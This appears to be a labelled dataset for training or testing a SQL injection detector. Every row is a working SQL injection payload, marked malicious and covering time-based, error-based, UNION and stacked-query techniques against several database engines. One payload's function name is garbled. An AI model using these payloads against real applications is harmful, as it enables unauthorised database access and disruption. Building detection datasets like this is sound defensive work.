payload;attack_type;label
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual);SQL injection;malicious
1') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
-5587%') or elt(1032=1032,3623) and ('%'=';SQL injection;malicious
1')) and 6690=3250#;SQL injection;malicious
"1);select case when 7951=1147 then 1 else null end--";SQL injection;malicious
-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--;SQL injection;malicious
1' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--;SQL injection;malicious
-3378')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('otbq'='otbq;SQL injection;malicious
1) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--;SQL injection;malicious
-8929' union all select 5324,5324,5324,5324,5324,5324--;SQL injection;malicious
"1"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""fbol"" like ""fbol";SQL injection;malicious
"-2726"")) or elt(1032=1032,3623) and ((""ococ""=""ococ";SQL injection;malicious
"1' in boolean mode);select (case when (8711=6432) then 1 else 8711*(select 8711 from master..sysdatabases) end)--";SQL injection;malicious
1')) or elt(6272=6272,sleep(5)) and (('fele'='fele;SQL injection;malicious
1'||(select 'ypqa' where 1961=1961 or 6793=(select 6793 from pg_sleep(5)))||';SQL injection;malicious
-8349) union all select 8126,8126#;SQL injection;malicious
1' in boolean mode) and 2388=benchmark(5000000,md5(0x6d457153))#;SQL injection;malicious
1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--;SQL injection;malicious
"1%"" or elt(6272=6272,sleep(5)) and ""%""=""";SQL injection;malicious
"1%"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""";SQL injection;malicious
1'+(select 'opqr' where 2442=2442 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--;SQL injection;malicious
"1;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--";SQL injection;malicious
"1' where 7176=7176;select pg_sleep(5)--";SQL injection;malicious
-7962')) as pgqz where 6058=6058 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--;SQL injection;malicious
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual# gnga";SQL injection;malicious
1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'ukxj'='ukxj;SQL injection;malicious
"1""))) rlike sleep(5) and (((""qcqx"" like ""qcqx";SQL injection;malicious
1')) rlike sleep(5)#;SQL injection;malicious
1)) as prnp where 4932=4932 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--;SQL injection;malicious
1%')) and 7756=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=';SQL injection;malicious
"1'||(select 'aojt' from dual where 8499=8499;select pg_sleep(5)--";SQL injection;malicious
"1"";waitfor delay '0:0:5' and ""cvqn"" like ""cvqn";SQL injection;malicious
1'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#;SQL injection;malicious
1'||(select 'fven' where 1433=1433 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))||';SQL injection;malicious
1%')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('%'=';SQL injection;malicious
-8007' where 9649=9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--;SQL injection;malicious
1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('ydxb'='ydxb;SQL injection;malicious
"1%"") and 2006=2006";SQL injection;malicious
-5732') union all select 7614,7614,7614,7614--;SQL injection;malicious
1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'nwdk' like 'nwdk;SQL injection;malicious
"1"") as buky where 7898=7898 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--";SQL injection;malicious
"-8819"") where 9119=9119 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--";SQL injection;malicious
"1"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""lide""=""lide";SQL injection;malicious
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (9481=9481";SQL injection;malicious
-8641%' order by 1--;SQL injection;malicious
1%')) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--;SQL injection;malicious
1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'yvzf'='yvzf;SQL injection;malicious
1%') and 7533=7533 and ('%'=';SQL injection;malicious
-6947')) as qqjp where 6700=6700 union all select 6700#;SQL injection;malicious
1 where 5485=5485 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--;SQL injection;malicious
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('vcgc' like 'vcgc";SQL injection;malicious
"1""));iif(5257=5257,1,1/0)";SQL injection;malicious
1'||(select 'zqwd' where 1647=1647 rlike sleep(5))||';SQL injection;malicious
"1"") where 9086=9086 or sleep(5)#";SQL injection;malicious
1' and 7533=7533;SQL injection;malicious
-2210' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'myvr' like 'myvr;SQL injection;malicious
1'+(select trte where 9173=9173 and 2006=2006;SQL injection;malicious
-9264') or 8571=8571--;SQL injection;malicious
1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('dgwe' like 'dgwe;SQL injection;malicious
1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'ntaw'='ntaw;SQL injection;malicious
-6202)) or 7845=1962--;SQL injection;malicious
"-5372"") as wlqm where 2432=2432 union all select 2432,2432,2432,2432,2432,2432#";SQL injection;malicious
-7246'||(select 'qchp' from dual where 8317=8317 order by 1--;SQL injection;malicious
"1));waitfor delay '0:0:5' and ((7619=7619";SQL injection;malicious
1')) and 7533=7533 and (('pagc' like 'pagc;SQL injection;malicious
-5420') union all select 2508,2508,2508,2508,2508,2508,2508#;SQL injection;malicious
1') rlike (select * from (select(sleep(5)))sgvo) and ('cmqe' like 'cmqe;SQL injection;malicious
1' in boolean mode) or 8466=benchmark(5000000,md5(0x694a4745))#;SQL injection;malicious
1) waitfor delay '0:0:5';SQL injection;malicious
1) where 2888=2888 or 8156=(select count(*) from generate_series(1,5000000))--;SQL injection;malicious
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'gpeo' like 'gpeo";SQL injection;malicious
1%')) union all select null,null,null,null,null,null,null#;SQL injection;malicious
-3433') where 8307=8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--;SQL injection;malicious
"-4054"" or 2824=4788--";SQL injection;malicious
"1'||(select 'lzzr' where 2477=2477;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'";SQL injection;malicious
-8654' union all select 7190,7190,7190,7190,7190#;SQL injection;malicious
1',(select (case when (3576=7744) then 1 else cast(1 as int)/(select 0 from dual) end) from dual);SQL injection;malicious
-7876%') union all select 3909,3909,3909,3909,3909#;SQL injection;malicious
-2153'||(select 'sofs' where 4126=4126 union all select 4126,4126,4126,4126,4126#;SQL injection;malicious
"1';select count(*) from generate_series(1,5000000) and 'roca'='roca";SQL injection;malicious
-6222)) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((3230=3230;SQL injection;malicious
"1"");if(7899=7899) select 7899 else drop function zbbp--";SQL injection;malicious
1%')) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--;SQL injection;malicious
"1')) as pqbq where 1865=1865;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--";SQL injection;malicious
1'))) and elt(1210=1210,sleep(5)) and ((('acdu'='acdu;SQL injection;malicious
-6637')) order by 1#;SQL injection;malicious
1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5);SQL injection;malicious
"1"") where 7514=7514;select case when 7717=7717 then 1 else null end--";SQL injection;malicious
1'+(select mems where 5091=5091 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))+';SQL injection;malicious
"-3370"") union all select 7845,7845,7845,7845,7845,7845#";SQL injection;malicious
-1396 where 5838=5838 or 9323=9323#;SQL injection;malicious
"1"" where 4183=4183 union all select null,null,null,null,null,null--";SQL injection;malicious
1',(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1);SQL injection;malicious
"1""));begin user_lock.sleep(5); end--";SQL injection;malicious
-7565%') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'=';SQL injection;malicious
1 where 7757=7757 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--;SQL injection;malicious
1'||(select 'feki' where 4082=4082 and (3587=4207)*4207)||';SQL injection;malicious
-5652%') union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--;SQL injection;malicious
"1%"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""=""";SQL injection;malicious
1) as drgs where 1989=1989 order by 1--;SQL injection;malicious
1))) union all select null,null,null,null,null,null,null,null,null--;SQL injection;malicious
-5516'+(select 'bmlv' where 7188=7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#;SQL injection;malicious
1%') and 9198=9198--;SQL injection;malicious
1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('maln' like 'maln;SQL injection;malicious
1'+(select lang where 4191=4191 union all select null,null#;SQL injection;malicious
"1"")) as rrms where 8185=8185 union all select null,null,null,null,null,null,null,null--";SQL injection;malicious
-7240')) union all select 8064,8064,8064#;SQL injection;malicious
1 where 6383=6383 or elt(6272=6272,sleep(5))--;SQL injection;malicious
1'))) or elt(5873=5873,sleep(5))#;SQL injection;malicious
"1"")) union all select null,null,null,null,null,null,null,null,null--";SQL injection;malicious
"1) where 2543=2543;iif(2205=4764,1,1/0)";SQL injection;malicious
-9247'))) union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--;SQL injection;malicious
"1"")) and 2388=benchmark(5000000,md5(0x6d457153))#";SQL injection;malicious
"-9011"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#";SQL injection;malicious
-5362) union all select 7297,7297,7297,7297,7297#;SQL injection;malicious
1')) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--;SQL injection;malicious
"1%"")) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--";SQL injection;malicious
1 where 8333=8333 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--;SQL injection;malicious
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'='qipt";SQL injection;malicious
1 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)# myqr;SQL injection;malicious
"1"") where 8588=8588;select (case when (3217=8421) then 3217 else cast(1 as int)/(select 0 from dual) end) from dual--";SQL injection;malicious
1)) and 4595=4595#;SQL injection;malicious
-1064' or make_set(6439=2937,2937) and 'qojd'='qojd;SQL injection;malicious
1') and elt(4249=4249,7259);SQL injection;malicious
1)) as pzoo where 8036=8036 or 6793=(select 6793 from pg_sleep(5))--;SQL injection;malicious
"1%""));select (case when (3486=6373) then 3486 else 3486*(select 3486 from mysql.db) end)#";SQL injection;malicious
1' where 1272=1272 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--;SQL injection;malicious
"1%'));call regexp_substring(repeat(right(char(2385),0),500000000),null)--";SQL injection;malicious
"1"" and (3020=3020)*6703 and ""tnzp"" like ""tnzp";SQL injection;malicious
1'||(select 'pyga' from dual where 8501=8501 or (select * from (select(sleep(5)))sddo)#;SQL injection;malicious
1) waitfor delay '0:0:5' and (2993=2993;SQL injection;malicious
-1889%'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=';SQL injection;malicious
1%') and 8635=(select count(*) from generate_series(1,5000000))--;SQL injection;malicious
"1%')));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#";SQL injection;malicious
"1)));if(7899=7899) select 7899 else drop function zbbp--";SQL injection;malicious
"1) as zodp where 9112=9112;select count(*) from generate_series(1,5000000)--";SQL injection;malicious
"1')) as mqnv where 9831=9831;select (case when (4994=1572) then 4994 else 4994*(select 4994 from mysql.db) end)#";SQL injection;malicious
"1"" where 9760=9760 or 4240=(select 4240 from pg_sleep(5))--";SQL injection;malicious
1 union all select null,null,null,null#;SQL injection;malicious
1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'vgro' like 'vgro;SQL injection;malicious
"1"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""dnmi"" like ""dnmi";SQL injection;malicious
